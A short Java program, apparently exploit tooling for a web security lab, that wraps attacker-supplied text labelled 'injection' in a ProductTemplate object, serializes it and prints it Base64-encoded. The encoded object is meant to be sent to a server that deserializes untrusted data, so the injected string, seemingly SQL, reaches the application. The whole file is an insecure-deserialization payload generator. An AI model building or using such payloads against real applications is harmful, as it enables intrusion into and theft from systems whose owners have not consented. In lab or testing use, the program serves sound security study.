import java.io.Serializable;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import data.productcatalog.ProductTemplate;

public class Main {
  public static void main(String[] args) throws Exception {
    if (args.length < 1) {
      System.out.println("Payload not present.");
      System.exit(1);
    }
    String injection = String.join(" ", args);
    System.out.println(serialize(new ProductTemplate(injection)));
  }

  private static String serialize(Serializable obj) throws Exception {
    var baos = new ByteArrayOutputStream(1024);
    try (var out = new ObjectOutputStream(baos)) {
      out.writeObject(obj);
    }
    return Base64.getEncoder().encodeToString(baos.toByteArray());
  }
}
